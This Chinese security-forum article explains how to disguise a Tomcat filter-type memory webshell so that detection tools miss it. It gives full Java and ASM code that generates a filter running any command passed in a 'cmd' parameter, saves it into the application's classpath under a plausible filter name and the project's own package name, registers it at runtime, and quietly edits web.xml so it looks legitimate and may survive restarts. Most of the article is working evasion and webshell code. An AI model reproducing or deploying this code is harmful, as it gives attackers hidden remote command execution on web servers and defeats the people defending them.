本文首发于先知社区：<https://xz.aliyun.com/t/10562>

介绍
--

学习了**c0ny1**师傅写的[查杀Java web filter型内存马](https://gv7.me/articles/2020/kill-java-web-filter-memshell/)

Filter型内存马的查杀思路主要是这四条：

1. Filter名称是否合理
2. Filter对应的类名是否合理
3. Filter对应的类是否在`classpath`下
4. 网站web.xml中是否存在改filter

笔者想办法绕过了这四条的验证

先来看看已有内存马查杀工具的效果

比如**天下大木头**师傅的查杀截图：

**arthas**

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-df9be0fb3dfa9fb6acf9ce2b2a292acc847378d4.png)

**copagent**

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-db3c153e0227c85904aa8cee983c3c6c4efb5d86.png)

比较好用的**java-memshell-scanner**

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bbfaab5874bd8767e0d04c7959b6bcdb1e9d991c.png)

效果
--

有针对性地对四条检测进行分析，最终能够达到以下的效果

1. 模拟看似**合法**的filter，例如`shiroFilter`和`userFilter`等
2. 读取已有filter的包名（例如这里的`org.sec.tomcat`）然后修改恶意filter的**包名一致**
3. 重要的一点：恶意filter在`classpath`中是**真实存在**的

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b72b2c9f7f0e4dd28089f086b81e5015d778d165.png)

4. 随机生成**合理的**filter的名字和filter对应的类名

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-eede0bea958b83204ee0c505f65b2d3525d25e72.png)

5. 自动修改`web.xml`中的内容（编译后的web.xml）

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-87de0478e922fb352b6c9b02ffca496db9e22eb9.png)

通过以上5步可以做到：

如果防御人员对**后端业务逻辑**和**代码**没有**比较深入的掌握**情况下是无法查出内存马的

哪怕借助工具也很难查杀

重命名
---

首先第一步是对已有业务Filter的信息做收集，以确实恶意的filter需要怎样命名

排除`org.apache.tomcat`包下的系统`Filter`只考虑项目包的自定义`Filter`

（核心代码参考**c0ny1**师傅的**java-memshell-scanner**）

```java
String startName = "";
String path = "";
// 获取context
WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardContext standardCtx = (StandardContext) webappClassLoaderBase.getResources().getContext();
HashMap<String, Object> filterConfigs1 = getFilterConfig(standardCtx);
Object[] filterMaps1 = getFilterMaps(standardCtx);
List<String> names = new ArrayList<>();
// 遍历已经存在的fitler
for (int i = 0; i < filterMaps1.length; i++) {
    Object fm = filterMaps1[i];
    Object appFilterConfig = filterConfigs1.get(getFilterName(fm));
    if (appFilterConfig == null) {
        continue;
    }
    Field _filter = appFilterConfig.getClass().getDeclaredField("filter");
    _filter.setAccessible(true);
    Object filter = _filter.get(appFilterConfig);
    String filterClassName = filter.getClass().getName();
    ApplicationFilterConfig afc = (ApplicationFilterConfig) appFilterConfig;
    // 拿到包名：a.b.class->a.b
    String[] temp = filterClassName.split("\\.");
    StringBuilder tmpName = new StringBuilder();
    for (int j = 0; j < temp.length - 1; j++) {
        tmpName.append(temp[j]);
        if (j != temp.length - 2) {
            tmpName.append(".");
        }
    }
    // 如果是tomcat的包略过
    if (tmpName.toString().contains("org.apache.tomcat")) {
        continue;
    }
    // 正确情况记录下包名和类名
    startName = tmpName.toString();
    // 拿到classpath为了后续添加文件
    URL url = filter.getClass().getResource("");
    path = url.toString();
    names.add(afc.getFilterName());
}
// a.b.c->a/b/c 后续有用
startName = startName.replaceAll("\\.", "/");
path = path.split("file:/")[1];
```

从常见filter列表里确定新的名字，需要和tomcat已有的名字不冲突

实际上这个`nameArray`数组可以设置为可配置的，自行根据目标业务逻辑编写

```java
String[] nameArray = new String[]{"testFilter", "loginFilter", "coreFilter",
                                  "userFilter", "manageFilter", "shiroFilter", "indexFilter"};
List<String> nameList = Arrays.asList(nameArray);
// 随机打乱数组
Collections.shuffle(nameList);
String finalName = null;
// 选择一个目前tomcat中不包含的filter
for (String s : nameArray) {
    if (names.contains(s)) {
        continue;
    }
    finalName = s;
}
if (finalName == null) {
    return;
}
String newClassName = finalName;
// 驼峰处理 testFilter->TestFilter
byte[] items = newClassName.getBytes();
items[0] = (byte)((char)items[0]-'a'+'A');;
newClassName = new String(items);
```

动态字节码
-----

根据以上收集到的信息，将字节码写入指定位置

例如项目的包名是`com.test.project`，模拟的类名是`UserFilter`，那么就需要构造出恶意的字节码，写入`.../classes/com/test/project/UserFilter.class`

```java
byte[] code = getFilter(startName + "/" + newClassName);
Files.write(
    Paths.get(path + "/" + newClassName + ".class"),
    code);
String tmpName = startName + "/" + newClassName;
tmpName = tmpName.replaceAll("/", ".");
```

上文的`getFilter`函数其实是重点部分，作用是根据类名生成字节码

动态生成字节码就要借助ASM框架，代码如下

```java
public static byte[] getFilter(String fullName) {
    ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
    MethodVisitor methodVisitor;

    classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, fullName, null, "java/lang/Object", new String[]{"javax/servlet/Filter"});
    methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
    methodVisitor.visitCode();
    methodVisitor.visitVarInsn(ALOAD, 0);
    methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
    methodVisitor.visitInsn(RETURN);
    methodVisitor.visitMaxs(1, 1);
    methodVisitor.visitEnd();
    methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "init", "(Ljavax/servlet/FilterConfig;)V", null, new String[]{"javax/servlet/ServletException"});
    methodVisitor.visitCode();
    methodVisitor.visitInsn(RETURN);
    methodVisitor.visitMaxs(0, 2);
    methodVisitor.visitEnd();
    methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "doFilter", "(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;Ljavax/servlet/FilterChain;)V", null, new String[]{"java/io/IOException", "javax/servlet/ServletException"});
    methodVisitor.visitCode();
    methodVisitor.visitVarInsn(ALOAD, 1);
    methodVisitor.visitTypeInsn(CHECKCAST, "javax/servlet/http/HttpServletRequest");
    methodVisitor.visitVarInsn(ASTORE, 4);
    methodVisitor.visitVarInsn(ALOAD, 4);
    methodVisitor.visitLdcInsn("cmd");
    methodVisitor.visitMethodInsn(INVOKEINTERFACE, "javax/servlet/http/HttpServletRequest", "getParameter", "(Ljava/lang/String;)Ljava/lang/String;", true);
    Label label0 = new Label();
    methodVisitor.visitJumpInsn(IFNULL, label0);
    methodVisitor.visitIntInsn(SIPUSH, 1024);
    methodVisitor.visitIntInsn(NEWARRAY, T_BYTE);
    methodVisitor.visitVarInsn(ASTORE, 5);
    methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
    methodVisitor.visitVarInsn(ALOAD, 4);
    methodVisitor.visitLdcInsn("cmd");
    methodVisitor.visitMethodInsn(INVOKEINTERFACE, "javax/servlet/http/HttpServletRequest", "getParameter", "(Ljava/lang/String;)Ljava/lang/String;", true);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
    methodVisitor.visitVarInsn(ASTORE, 6);
    methodVisitor.visitVarInsn(ALOAD, 6);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Process", "getInputStream", "()Ljava/io/InputStream;", false);
    methodVisitor.visitVarInsn(ALOAD, 5);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/InputStream", "read", "([B)I", false);
    methodVisitor.visitVarInsn(ISTORE, 7);
    methodVisitor.visitVarInsn(ALOAD, 2);
    methodVisitor.visitMethodInsn(INVOKEINTERFACE, "javax/servlet/ServletResponse", "getWriter", "()Ljava/io/PrintWriter;", true);
    methodVisitor.visitTypeInsn(NEW, "java/lang/String");
    methodVisitor.visitInsn(DUP);
    methodVisitor.visitVarInsn(ALOAD, 5);
    methodVisitor.visitInsn(ICONST_0);
    methodVisitor.visitVarInsn(ILOAD, 7);
    methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/String", "<init>", "([BII)V", false);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/PrintWriter", "write", "(Ljava/lang/String;)V", false);
    methodVisitor.visitVarInsn(ALOAD, 6);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Process", "destroy", "()V", false);
    methodVisitor.visitInsn(RETURN);
    methodVisitor.visitLabel(label0);
    methodVisitor.visitVarInsn(ALOAD, 3);
    methodVisitor.visitVarInsn(ALOAD, 1);
    methodVisitor.visitVarInsn(ALOAD, 2);
    methodVisitor.visitMethodInsn(INVOKEINTERFACE, "javax/servlet/FilterChain", "doFilter", "(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V", true);
    methodVisitor.visitInsn(RETURN);
    methodVisitor.visitMaxs(6, 8);
    methodVisitor.visitEnd();
    methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "destroy", "()V", null, null);
    methodVisitor.visitCode();
    methodVisitor.visitInsn(RETURN);
    methodVisitor.visitMaxs(0, 1);
    methodVisitor.visitEnd();
    classWriter.visitEnd();
    return classWriter.toByteArray();
}
```

其实复杂的ASM代码，本质是生成以下这样的类的字节码

```java
public class ShellFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        if (req.getParameter("cmd") != null) {
            byte[] bytes = new byte[1024];
            Process process = Runtime.getRuntime().exec(req.getParameter("cmd"));
            int len = process.getInputStream().read(bytes);
            servletResponse.getWriter().write(new String(bytes, 0, len));
            process.destroy();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}
```

生成字节码后写入classpath中对应的地方，加载和实例化`Filter`的时候直接`Class.forName`就可以

```java
// 反射调用
Class<?> c = standardContext.getClass().forName(tmpName);
Filter filter = (Filter) c.newInstance();

// 以下是注册filter的逻辑
FilterDef filterDef = new FilterDef();
filterDef.setFilter(filter);
filterDef.setFilterName(finalName);
filterDef.setFilterClass(filter.getClass().getName());
standardContext.addFilterDef(filterDef);

FilterMap filterMap = new FilterMap();
filterMap.addURLPattern("/*");
filterMap.setFilterName(finalName);
filterMap.setDispatcher(DispatcherType.REQUEST.name());

standardContext.addFilterMapBefore(filterMap);

Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

filterConfigs.put(finalName, filterConfig);
```

修改配置
----

最后一步就是修改`web.xml`的配置了

虽然修改的是编译后的`web.xml`，但是防御人员一般没有源码审计，只能审计编译后的字节码和`web.xml`文件

```java
// 注意得加入换行和缩进达到视觉美观
// 要不然一眼就能看出来被修改过
String targetData = "    <filter>\n" +
    "        <filter-name>%s</filter-name>\n" +
    "        <filter-class>%s</filter-class>\n" +
    "        <init-param>\n" +
    "            <param-name>charset</param-name>\n" +
    "            <param-value>UTF-8</param-value>\n" +
    "        </init-param>\n" +
    "    </filter>\n" +
    "    <filter-mapping>\n" +
    "        <filter-name>%s</filter-name>\n" +
    "        <url-pattern>/*</url-pattern>\n" +
    "    </filter-mapping>\n";
String className1 = startName + "/" + newClassName;
className1 = className1.replaceAll("/",".");
targetData = String.format(targetData, finalName,className1,finalName);

String resourcePath = filter.getClass().getResource("").toString();
// 处理路径问题
resourcePath = resourcePath.split("file:/")[1];
resourcePath = resourcePath.split("WEB-INF")[0];
String xmlPath = resourcePath+"WEB-INF/web.xml";
byte[] data = Files.readAllBytes(Paths.get(xmlPath));
String dataStr = new String(data);
String prefix = dataStr.split("</web-app>")[0];
StringBuilder finalData = new StringBuilder();
finalData.append(prefix);
finalData.append(targetData);
finalData.append("</web-app>");
// 写入新数据
Files.write(Paths.get(xmlPath),finalData.toString().getBytes(StandardCharsets.UTF_8));
```

总结
--

难点在于动态字节码，其他部分做起来不算复杂

一个思考：该手段是否有可能导致内存马的**持久化**呢？

已经写入了目标的classpath，由于模拟配置了`web.xml`，是否会导致第二次启动直接加载了恶意`Filter`

后来笔者挖某知名框架内存马时，摸索出一种进阶的内存马免杀：将恶意代码隐藏到框架必须的Filter中

将在后续的文章中和大家分享

笔者目前本科在读，才疏学浅，错误和不足之处还请大佬指出，十分感谢！

代码在这里：<https://github.com/EmYiQing/MemShell>